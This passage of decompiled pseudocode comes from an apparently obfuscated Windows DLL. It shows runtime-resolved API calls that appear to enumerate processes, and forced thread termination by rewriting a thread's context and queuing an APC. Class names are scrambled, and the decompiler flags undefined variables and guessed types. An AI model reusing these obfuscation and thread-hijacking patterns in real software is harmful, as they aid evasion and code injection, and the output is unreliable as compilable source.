  a1[1] = a3;
  sub_1000CE26(a1 + 2, (int)&a4);
  sub_1000CE59(&a4);
  return a1;
}

//----- (1001D7F9) --------------------------------------------------------
_DWORD *__stdcall sub_1001D7F9(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 8);
  return a2;
}

//----- (1001D82E) --------------------------------------------------------
void __cdecl sub_1001D82E(_DWORD *a1)
{
  int v1; // ecx
  int v2; // ecx
  int v3; // ecx
  void *v4; // eax
  int v5; // ecx
  int v6; // [esp-10h] [ebp-29Ch] BYREF
  int v7; // [esp-Ch] [ebp-298h]
  DWORD v8; // [esp-8h] [ebp-294h] BYREF
  int v9; // [esp-4h] [ebp-290h]
  int v10[6]; // [esp+0h] [ebp-28Ch] BYREF
  int v11; // [esp+18h] [ebp-274h] BYREF
  _DWORD pExceptionObject[3]; // [esp+1Ch] [ebp-270h] BYREF
  int v13; // [esp+28h] [ebp-264h]
  DWORD *v14; // [esp+2Ch] [ebp-260h]
  int v15; // [esp+30h] [ebp-25Ch] BYREF
  char *v16; // [esp+34h] [ebp-258h]
  _DWORD *v17; // [esp+38h] [ebp-254h]
  char *v18; // [esp+3Ch] [ebp-250h]
  char *v19; // [esp+40h] [ebp-24Ch]
  bool v20; // [esp+47h] [ebp-245h]
  int v21[9]; // [esp+48h] [ebp-244h] BYREF
  wchar_t v22[270]; // [esp+6Ch] [ebp-220h] BYREF
  int v23; // [esp+288h] [ebp-4h]

  v23 = 0;
  v17 = a1;
  v13 = 0;
  v19 = (char *)v10;
  sub_1000CE26(v10, (int)&unk_100BF764);
  v23 = 1;
  v9 = v1;
  v8 = v1;
  v18 = (char *)&v8;
  sub_1000CE26(&v8, (int)&unk_100BF76C);
  LOBYTE(v23) = 0;
  v16 = sub_1002481B(v8, v9, v10[0]);
  v19 = (char *)v10;
  sub_1000CE26(v10, (int)&unk_100BF754);
  v23 = 3;
  v9 = v2;
  v8 = v2;
  v18 = (char *)&v8;
  sub_1000CE26(&v8, (int)&unk_100BF76C);
  LOBYTE(v23) = 0;
  v18 = sub_1002481B(v8, v9, v10[0]);
  v19 = (char *)v10;
  sub_1000CE26(v10, (int)&unk_100BF75C);
  v23 = 5;
  v9 = v3;
  v8 = v3;
  v14 = &v8;
  sub_1000CE26(&v8, (int)&unk_100BF76C);
  LOBYTE(v23) = 0;
  v19 = sub_1002481B(v8, v9, v10[0]);
  v10[1] = GetCurrentProcessId();
  v10[0] = GetCurrentProcessId();
  v9 = 0;
  v8 = 0;
  v4 = (void *)((int (*)(void))v16)();
  sub_10029136(&v15, v4, 2, 0, v8, v9);
  v23 = 7;
  if ( !sub_100143F3((int)&v15) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1000EF17(v17);
  v13 = 1;
  v21[0] = 556;
  if ( ((int (__cdecl *)(char *, int *))v18)(v16, v21) == 1 )
  {
    do
    {
      v7 = v5;
      v6 = v5;
      v14 = (DWORD *)&v6;
      sub_1000CC20(&v6, v22);
      LOBYTE(v23) = 7;
      sub_1001D7B1(&v11, v21[2], v21[6], v6, v7);
      LOBYTE(v23) = 9;
      sub_1000A289(v17, (int)&v11);
      v20 = ((int (__cdecl *)(char *, int *))v19)(v16, v21) != 1;
      LOBYTE(v23) = 7;
      sub_1000A4C9((int)&v11);
    }
    while ( !v20 );
  }
  LOBYTE(v23) = 0;
  sub_10014389(&v15);
  sub_1006A5A7();
}
// 1001D86C: variable 'v1' is possibly undefined
// 1001D8B1: variable 'v2' is possibly undefined
// 1001D8F1: variable 'v3' is possibly undefined
// 1001D9A4: variable 'v5' is possibly undefined
// 1001D82E: using guessed type _DWORD pExceptionObject[3];
// 1001D82E: using guessed type wchar_t var_220[270];

//----- (1001DA43) --------------------------------------------------------
void __noreturn sub_1001DA43()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_100167F9(pExceptionObject, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
}
// 1001DA43: using guessed type void __noreturn sub_1001DA43();
// 1001DA43: using guessed type _DWORD pExceptionObject[3];

//----- (1001DA66) --------------------------------------------------------
_DWORD *__stdcall sub_1001DA66(_DWORD *a1, int a2)
{
  sub_1000EF4E(a1);
  *a1 = &off_10093478;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  sub_1000A4F0(a2, (int)a1);
  return a1;
}
// 10093478: using guessed type int (__thiscall *off_10093478)(void *Block, char);

//----- (1001DAB3) --------------------------------------------------------
_DWORD *__thiscall sub_1001DAB3(_DWORD *Block, char a2)
{
  sub_1001DAD7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001DAD7) --------------------------------------------------------
void __thiscall sub_1001DAD7(_DWORD *this)
{
  bool v2; // cf
  int (__thiscall **pExceptionObject)(void *, char); // [esp+8h] [ebp-Ch] BYREF
  char v4; // [esp+Ch] [ebp-8h]
  int v5; // [esp+10h] [ebp-4h]

  v2 = this[2] < 0x32u;
  *this = off_100941B8;
  if ( !v2 )
    ExitThread(0);
  if ( *((_BYTE *)this + 4) && !__uncaught_exception() && !sub_100163AB() )
  {
    v5 = this[2] + 1;
    pExceptionObject = off_100941B8;
    v4 = 1;
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__);
  }
}
// 100733BE: using guessed type bool __cdecl __uncaught_exception();
// 100941B8: using guessed type int (__thiscall *off_100941B8[2])(void *Block, char);

//----- (1001DB2E) --------------------------------------------------------
_BYTE *__thiscall sub_1001DB2E(_BYTE *this, int a2)
{
  _BYTE *result; // eax

  result = this;
  *(_DWORD *)this = off_100941B8;
  this[4] = *(_BYTE *)(a2 + 4);
  *((_DWORD *)this + 2) = *(_DWORD *)(a2 + 8);
  return result;
}
// 100941B8: using guessed type int (__thiscall *off_100941B8[2])(void *Block, char);

//----- (1001DB4C) --------------------------------------------------------
LPVOID sub_1001DB4C()
{
  LPVOID result; // eax

  result = TlsGetValue(dword_100BF778);
  if ( !result )
    return (LPVOID)sub_1002A28C();
  return result;
}

//----- (1001DB62) --------------------------------------------------------
int __stdcall sub_1001DB62(int a1)
{
  sub_1000E9E2((_DWORD *)a1, 0, 0);
  *(_DWORD *)a1 = &off_10094168;
  sub_10017224(a1 + 12);
  sub_100202AB((_DWORD *)(a1 + 48));
  *(_DWORD *)(a1 + 8) = -1;
  *(_DWORD *)(a1 + 88) = 0;
  *(_DWORD *)(a1 + 92) = 0;
  *(_BYTE *)(a1 + 96) = 0;
  return a1;
}
// 10094168: using guessed type int (__thiscall *off_10094168)(void *Block, char);

//----- (1001DBB9) --------------------------------------------------------
int *__thiscall sub_1001DBB9(int *Block, char a2)
{
  sub_1001DEAB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001DBD8) --------------------------------------------------------
void __stdcall __noreturn pfnAPC(ULONG_PTR Parameter)
{
  int (__thiscall **pExceptionObject)(void *, char); // [esp+0h] [ebp-Ch] BYREF
  char v2; // [esp+4h] [ebp-8h]
  int v3; // [esp+8h] [ebp-4h]

  if ( !__uncaught_exception() && !sub_100163AB() )
  {
    v3 = 0;
    pExceptionObject = off_100941B8;
    v2 = 1;
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVXbaxizGuimmJkzwxbaxi_Xrtioo_bjxssd_sr__);
  }
  ExitThread(0);
}
// 100733BE: using guessed type bool __cdecl __uncaught_exception();
// 100941B8: using guessed type int (__thiscall *off_100941B8[2])(void *Block, char);

//----- (1001DC15) --------------------------------------------------------
void __thiscall sub_1001DC15(int this, int a2)
{
  int v3; // eax
  void *v4; // eax
  int v5; // eax
  void *v6; // eax
  void *v7; // eax
  BOOL pExceptionObject; // [esp+10h] [ebp-30Ch] BYREF
  _DWORD v9[2]; // [esp+14h] [ebp-308h] BYREF
  _DWORD v10[3]; // [esp+1Ch] [ebp-300h] BYREF
  _DWORD v11[3]; // [esp+28h] [ebp-2F4h] BYREF
  CONTEXT Context; // [esp+34h] [ebp-2E8h] BYREF
  int v13; // [esp+318h] [ebp-4h]

  sub_100171BE((int *)(this + 12), v9);
  v13 = 0;
  if ( *(_DWORD *)(this + 88) != 3 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_1001DF6C((int *)this);
  v13 = -1;
  sub_100171F2(v9);
  *(_BYTE *)(this + 96) = 1;
  memset(&Context.Dr0, 0, 0x2C8u);
  v3 = *(_DWORD *)this;
  Context.ContextFlags = 65599;
  v4 = (void *)(*(int (__thiscall **)(int))(v3 + 60))(this);
  if ( !GetThreadContext(v4, &Context) )
  {
    sub_1001DFE4((int *)this);
    sub_100167F9(v10, 1);
    _CxxThrowException(v10, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v5 = *(_DWORD *)this;
  Context.Eip = (DWORD)pfnAPC;
  v6 = (void *)(*(int (__thiscall **)(int))(v5 + 60))(this);
  pExceptionObject = SetThreadContext(v6, &Context);
  sub_1001DFE4((int *)this);
  v7 = (void *)(*(int (__thiscall **)(int))(*(_DWORD *)this + 60))(this);
  QueueUserAPC((PAPCFUNC)pfnAPC, v7, 0);
  PostThreadMessageA(*(_DWORD *)(this + 8), 0, 0, 0);
  if ( !pExceptionObject )
  {
    sub_100167F9(v11, 1);
    _CxxThrowException(v11, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_10014E23(this, a2, 0);
  *(_DWORD *)(this + 88) = 7;
  sub_1001E23F((_DWORD *)this);
}
// 1001DC15: using guessed type _DWORD var_308[2];
// 1001DC15: using guessed type _DWORD var_300[3];
// 1001DC15: using guessed type _DWORD var_2F4[3];

//----- (1001DD96) --------------------------------------------------------
int __thiscall sub_1001DD96(unsigned int *this)
{
  int v2; // eax
  unsigned int v3; // edi
  uintptr_t v4; // eax
  _DWORD v6[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v7[2]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v8; // [esp+24h] [ebp-14h] BYREF
  _DWORD pExceptionObject[3]; // [esp+28h] [ebp-10h] BYREF
  int v10; // [esp+34h] [ebp-4h]

  sub_100171BE((int *)this + 3, v7);
  v10 = 0;
  v2 = this[22];
  if ( v2 == 4 )
  {
    sub_10016441(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  if ( v2 && v2 < 5 )
  {
    sub_10016441(&v8);
    _CxxThrowException(&v8, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v3 = *this;
  *((_BYTE *)this + 96) = 0;
  v4 = _beginthreadex(0, 0, (_beginthreadex_proc_type)StartAddress, this, 0, this + 2);
  (*(void (__thiscall **)(unsigned int *, uintptr_t, _DWORD))(v3 + 12))(this, v4, 0);
  if ( !(*(int (__thiscall **)(unsigned int *))(*this + 60))(this)
    || (*(int (__thiscall **)(unsigned int *))(*this + 60))(this) == -1 )
  {
    (*(void (__thiscall **)(unsigned int *, int, _DWORD))(*this + 12))(this, -1, 0);
    sub_100167F9(v6, 1);
    _CxxThrowException(v6, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  this[22] = 1;
  v10 = -1;
  return sub_100171F2(v7);
}
// 1001DD96: using guessed type _DWORD var_1C[2];
// 1001DD96: using guessed type _DWORD pExceptionObject[3];
// 1001DD96: using guessed type _DWORD var_28[3];

//----- (1001DE5F) --------------------------------------------------------
int __thiscall sub_1001DE5F(int *this)
{
  int v2; // edi
  int v3; // eax
  _DWORD v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  sub_100171BE(this + 3, v5);
  v6 = 0;
  v2 = (*(int (__thiscall **)(int *))(*this + 8))(this);
  v3 = *this;
  this[22] = 4;
  (*(void (__thiscall **)(int *, int, _DWORD))(v3 + 12))(this, -1, 0);
  v6 = -1;
  sub_100171F2(v5);
  return v2;
}
// 1001DE5F: using guessed type _DWORD var_14[4];

//----- (1001DEAB) --------------------------------------------------------
LONG __thiscall sub_1001DEAB(int *this)
{
  *this = (int)&off_10094168;
  if ( this[22] != 4 )
    sub_1001E192(this, 0);
  sub_100202D7(this + 12);
  sub_100172B1(this + 3);
  return sub_1000EA34(this);
}
// 10094168: using guessed type int (__thiscall *off_10094168)(void *Block, char);

//----- (1001DF17) --------------------------------------------------------
int __thiscall sub_1001DF17(_DWORD *this)
{
  return this[22];
}

//----- (1001DF1B) --------------------------------------------------------
int sub_1001DF1B()
{
  return 1;
}

//----- (1001DF1F) --------------------------------------------------------
int __thiscall sub_1001DF1F(_DWORD *this)
{
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( this[22] != 6 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return this[23];
}

//----- (1001DF44) --------------------------------------------------------
int __thiscall sub_1001DF44(_DWORD *this)
{
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  if ( this[22] == 4 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return *(_DWORD *)(this[1] + 16);
}

//----- (1001DF6C) --------------------------------------------------------
int __thiscall sub_1001DF6C(int *this)
{
  int v2; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v5[2]; // [esp+1Ch] [ebp-1Ch] BYREF
  _DWORD v6[4]; // [esp+24h] [ebp-14h] BYREF
  int v7; // [esp+34h] [ebp-4h]

  sub_100171BE(this + 3, v5);
  v7 = 0;
  v2 = this[22];
  if ( !v2 )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  if ( v2 == 4 )
  {
    sub_10016441(v6);
    _CxxThrowException(v6, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  if ( v2 <= 3 )
  {
    sub_1000EC2C(this);
    this[22] = 2;
  }
  v7 = -1;
  return sub_100171F2(v5);
}
// 1001DF6C: using guessed type _DWORD var_1C[2];
// 1001DF6C: using guessed type _DWORD pExceptionObject[3];
// 1001DF6C: using guessed type _DWORD var_14[4];

//----- (1001DFE4) --------------------------------------------------------
char __thiscall sub_1001DFE4(int *this)
{
  char v2; // bl
  int v3; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v6[2]; // [esp+1Ch] [ebp-1Ch] BYREF
  _DWORD v7[4]; // [esp+24h] [ebp-14h] BYREF
  int v8; // [esp+34h] [ebp-4h]

  sub_100171BE(this + 3, v6);
  v2 = 0;
  v8 = 0;
  v3 = this[22];
  if ( !v3 )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  if ( v3 == 4 )
  {
    sub_10016441(v7);
    _CxxThrowException(v7, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  if ( v3 > 3 )
    goto LABEL_6;
  if ( sub_1000EBB2(this) )
  {
    this[22] = 3;
    v2 = 1;
LABEL_6:
    v8 = -1;
    sub_100171F2(v6);
    return v2;
  }
  v8 = -1;
  sub_100171F2(v6);
  return 0;
}
// 1001DFE4: using guessed type _DWORD var_1C[2];
// 1001DFE4: using guessed type _DWORD pExceptionObject[3];
// 1001DFE4: using guessed type _DWORD var_14[4];

//----- (1001E075) --------------------------------------------------------
void __thiscall sub_1001E075(int *this, int a2, int a3)
{
  int v4; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-20h] BYREF
  _DWORD v6[4]; // [esp+1Ch] [ebp-14h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  if ( this[22] < 5 )
  {
    sub_100171BE(this + 3, v6);
    v7 = 0;
    v4 = this[22];
    if ( !v4 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
    if ( v4 == 4 )
    {
      sub_10016441(&a3);
      _CxxThrowException(&a3, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
    }
    v7 = -1;
    if ( v4 < 5 )
    {
      sub_100171F2(v6);
      sub_10014E23((int)this, a2, a3);
    }
    else
    {
      sub_100171F2(v6);
    }
  }
}
// 1001E075: using guessed type _DWORD var_14[4];
// 1001E075: using guessed type _DWORD pExceptionObject[3];

//----- (1001E101) --------------------------------------------------------
void __thiscall sub_1001E101(int *this, DWORD a2)
{
  int v3; // eax
  _DWORD v4[3]; // [esp+10h] [ebp-20h] BYREF
  _DWORD pExceptionObject[4]; // [esp+1Ch] [ebp-14h] BYREF
  int v6; // [esp+2Ch] [ebp-4h]

  v4[2] = this;
  v6 = 0;
  sub_100171BE(this + 3, v4);
  LOBYTE(v6) = 1;
  if ( this[22] == 4 )
  {
    sub_10016441(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  LOBYTE(v6) = 0;
  sub_100171F2(v4);
  v6 = -1;
  v3 = this[22];
  if ( v3 == 3 || v3 == 2 || v3 == 1 )
  {
    sub_1000EA95(this, a2);
    sub_1001E23F(this);
    this[22] = 7;
  }
}
// 1001E101: using guessed type _DWORD pExceptionObject[4];

//----- (1001E192) --------------------------------------------------------
void __thiscall sub_1001E192(int *this, int a2)
{
  int v3; // eax
  _DWORD v4[3]; // [esp+10h] [ebp-24h] BYREF
  int pExceptionObject; // [esp+1Ch] [ebp-18h] BYREF
  char v6; // [esp+23h] [ebp-11h]
  int v7; // [esp+30h] [ebp-4h]

  v4[2] = this;
  sub_100171BE(this + 3, v4);
  v7 = 0;
  if ( this[22] == 4 )
  {
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  v7 = -1;
  sub_100171F2(v4);
  v6 = 0;
  v3 = this[22];
  if ( v3 == 3 || v3 == 2 || v3 == 1 )
  {
    v7 = 1;
    if ( this[22] == 3 )
    {
      sub_1001DC15((int)this, 5000);
      v6 = 1;
    }
    v7 = -1;
    if ( !v6 )
      (*(void (__thiscall **)(int *, int))(*this + 68))(this, a2);
    sub_1001E23F(this);
  }
}
// 1001E192: using guessed type _DWORD pExceptionObject;

//----- (1001E23F) --------------------------------------------------------
void __thiscall sub_1001E23F(_DWORD *this)
{
  _DWORD *v1; // edi
  unsigned int v2; // ebx
  int v3; // esi
  int v4; // [esp+14h] [ebp-20h] BYREF
  unsigned int v5; // [esp+18h] [ebp-1Ch]
  int i; // [esp+30h] [ebp-4h]

  v1 = this + 12;
  (*(void (__thiscall **)(_DWORD *, int *))(this[12] + 16))(this + 12, &v4);
  v2 = 0;
  for ( i = 0; v2 < v5; ++v2 )
  {
    v3 = *(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v4 + 44))(&v4, v2);
    sub_10017417(v3);
  }
  (*(void (__thiscall **)(_DWORD *))(*v1 + 28))(v1);
  i = -1;
  sub_1001F90E((int)&v4);
}

//----- (1001E2CA) --------------------------------------------------------
unsigned int __stdcall StartAddress(int *lpTlsValue)
{
  _DWORD v2[3]; // [esp+10h] [ebp-28h] BYREF
  _DWORD v3[2]; // [esp+1Ch] [ebp-1Ch] BYREF
  int v4; // [esp+34h] [ebp-4h]

  v4 = 0;
  sub_10010428((int)v2);
  LOBYTE(v4) = 1;
  sub_1000EFCA();
  if ( !TlsSetValue(dword_100BF778, lpTlsValue) )
    sub_1002A2B8();
  sub_100171BE(lpTlsValue + 3, v3);
  LOBYTE(v4) = 2;
  if ( lpTlsValue[22] != 4 )
    lpTlsValue[22] = 3;
  LOBYTE(v4) = 1;
  sub_100171F2(v3);
  lpTlsValue[23] = (*(int (__thiscall **)(int *))(*lpTlsValue + 76))(lpTlsValue);
  sub_100171BE(lpTlsValue + 3, v3);
  LOBYTE(v4) = 3;
  if ( lpTlsValue[22] != 4 )
    lpTlsValue[22] = 6;
  LOBYTE(v4) = 1;
  sub_100171F2(v3);
  LOBYTE(v4) = 0;
  sub_10010466(v2);
  return 0;
}
// 1002A2B8: using guessed type void __noreturn sub_1002A2B8(void);
// 1001E2CA: using guessed type _DWORD var_28[3];
// 1001E2CA: using guessed type _DWORD var_1C[2];

//----- (1001E47D) --------------------------------------------------------
void __thiscall sub_1001E47D(_DWORD *this)
{
  *this = &off_100941E0;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100941E0: using guessed type int (__thiscall *off_100941E0)(void *Block, char);

//----- (1001E4A2) --------------------------------------------------------
BOOL __thiscall sub_1001E4A2(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1001E4C2) --------------------------------------------------------
int __thiscall sub_1001E4C2(int this, int a2)
{
  sub_1001F02A((void *)(this + 4), a2);
  return a2;
}

//----- (1001E4F3) --------------------------------------------------------
int __thiscall sub_1001E4F3(int this, int a2)
{
  sub_1001F09C((void *)(this + 20), a2);
  return a2;
}

//----- (1001E524) --------------------------------------------------------
_DWORD *__thiscall sub_1001E524(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x18u);
  if ( v3 )
    v4 = sub_1001F10E(this, v3);
  else
    v4 = 0;
  sub_100204C8(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001E575) --------------------------------------------------------
_DWORD *__thiscall sub_1001E575(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1001F1DF(this, v3, 0);
  else
    v4 = 0;
  sub_10020546(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001E5C8) --------------------------------------------------------
_DWORD *__thiscall sub_1001E5C8(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_1001F349(this, v3, 0);
  else
    v4 = 0;
  sub_100203D4(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001E61B) --------------------------------------------------------
_DWORD *__thiscall sub_1001E61B(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1001F1DF(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10020546(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001E676) --------------------------------------------------------
_DWORD *__thiscall sub_1001E676(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_1001F349(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_100203D4(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001E6D1) --------------------------------------------------------
_DWORD *__thiscall sub_1001E6D1(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1001F1DF(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10020546(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001E746) --------------------------------------------------------
_DWORD *__thiscall sub_1001E746(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_1001F349(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_100203D4(a2, (int)v6);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001E7BB) --------------------------------------------------------
void __thiscall sub_1001E7BB(_DWORD *this)
{
  *this = &off_10094364;
  *this = off_10092F20;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 10094364: using guessed type int (__thiscall *off_10094364)(void *Block, char);

//----- (1001E7E0) --------------------------------------------------------
int *__thiscall sub_1001E7E0(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1001F05D(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1001E836: variable 'v5' is possibly undefined

//----- (1001E848) --------------------------------------------------------
int *__thiscall sub_1001E848(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_1001EFC3(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1001E89E: variable 'v5' is possibly undefined

//----- (1001E8B0) --------------------------------------------------------
void __thiscall sub_1001E8B0(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10020585(v2);
}

//----- (1001E8E8) --------------------------------------------------------
void __thiscall sub_1001E8E8(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10020585(v3);
}

//----- (1001E923) --------------------------------------------------------
void __thiscall sub_1001E923(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10020585(v2);
}

//----- (1001E95B) --------------------------------------------------------
int __thiscall sub_1001E95B(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10020413(v4);
  return v2;
}

//----- (1001E997) --------------------------------------------------------
int __thiscall sub_1001E997(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10020585(v4);
  return v2;
}

//----- (1001E9D3) --------------------------------------------------------
void __thiscall sub_1001E9D3(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

